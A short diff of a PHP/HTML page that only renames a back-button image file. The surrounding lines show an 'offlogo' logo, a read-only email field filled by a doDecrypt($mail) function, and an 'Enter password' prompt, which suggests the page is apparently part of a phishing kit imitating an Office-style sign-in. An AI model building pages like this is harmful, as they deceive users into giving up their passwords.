@@ -36,7 +36,7 @@ function doDecrypt($mail)
             <div class="boxing" id="boxing" >
             <img id="logo" src="offlogo.png"></a>
                 <div >  
-			<a href="#"> <img role="presentation" src="offbackicon.png"></a>         
+			<a href="#"> <img role="presentation" src="off-backicon.png"></a>         
           <input type="email" name="email" id="email" value="<?php echo doDecrypt($mail); ?>"  placeholder="" readonly size="35" >
         <div class="form-outline">
         <h4 class="entpass">Enter password</h4>
